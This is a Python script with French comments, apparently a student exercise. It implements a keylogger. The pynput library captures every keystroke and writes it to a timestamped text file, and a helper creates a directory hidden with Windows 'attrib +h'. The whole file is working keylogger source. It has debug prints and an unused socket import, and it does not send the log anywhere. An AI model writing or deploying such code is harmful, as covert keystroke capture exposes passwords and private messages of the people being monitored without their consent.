import platform, sys, os, socket
sys.path.append(r"c:\users\feuil\appdata\local\packages\pythonsoftwarefoundation.python.3.11_qbz5n2kfra8p0\localcache\local-packages\python311\site-packages")
from pynput.keyboard import Key, Listener
from datetime import datetime
# re, io, shutil, os

# ~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_ VARIABLES GLOBALES ~_~_~_~_~_~_~_~_~_~_~_~_~_~
ficname = 'fic_test1.txt'
dirname = 'toto'
caps = 0

def makeDirectory():
    try:
        os.mkdir(dirname)
        os.system("attrib +h "+dirname)
        # SUPPRIMER LE PRINT CI-DESSOUS AVANT RENDU &-&-&-&-&-&-&-&
    except Exception as e:
        print(f"Error with mkdir : {e}")

def on_press(touche):
    print(f"{touche} pressée")
    fic_write(str(touche))

def on_release(touche):
    print(f"{touche} relâchée")
    if touche==Key.esc:
        return False

def file_open(*texts):
    with open(ficname, 'a') as fic:
        for text in texts:
            fic.write(text)

def cle_speciale(char):
    if "enter" in char:
        file_open('\n')
    elif "back" in char:
        with open(ficname,'rb+') as fic:
            fic.seek(-1,2)
            print("Je viens de faire seek")
            print(fic.tell())
            fic.truncate()
            print("TRUNCATE")
            fic.seek(0,2)
            print(fic.tell())
    elif "space" in char:
        file_open(' ')
    #
    elif "caps" in char: # touche majuscule
        global caps
        if caps==0: caps=1
        else:caps=0
    elif "tab" in char:
        file_open('\t')
    elif "shift" in char:
        file_open('{Shift}')
    elif "esc" in char:
        file_open('{Echap}')

'''def fic_write(char):
    try:
        cara = re.findall(r'[A-Za-z]',char)
        cara = ''.join(cara)
        # SI LONGUEUR EST PLUS GRANDE QUE 1
        # CÀD SI LA TOUCHE N'EST PAS UNE LETTRE
        # EXEMPLE : ENTER, BACK, CTRL
        # ENTRER DANS LA FONCTION SWITCH CASE
        if (len(cara)-1>0):
            cle_speciale(cara)
        else:
            c = cara[0]
            file_open(c)
    except Exception as e:
        print(f'Error : {e}')'''

def fic_write(char):
    try:
        # SI LONGUEUR EST PLUS GRANDE QUE 1
        # CÀD SI LA TOUCHE N'EST PAS UNE LETTRE
        # EXEMPLE : ENTER, BACK, CTRL
        # ENTRER DANS LA FONCTION SWITCH CASE
        print("CHAR =",char)
        if (len(char)-3>0):
            cle_speciale(char)
        else:
            global caps
            if caps==0:file_open(char[1])
            else:file_open(char[1].swapcase())
    except Exception as e:
        print(f'Error : {e}')

def klisten():
    now = datetime.now()
    hour = now.strftime('%H:%M:%S')
    jour = now.strftime('%d/%m/%Y')
    file_open('\n\n'+jour+' >> '+hour+'\n\n')
        # Ajouter un compteur de temps
    with Listener(on_press=on_press,on_release=on_release) as lili:
        lili.join()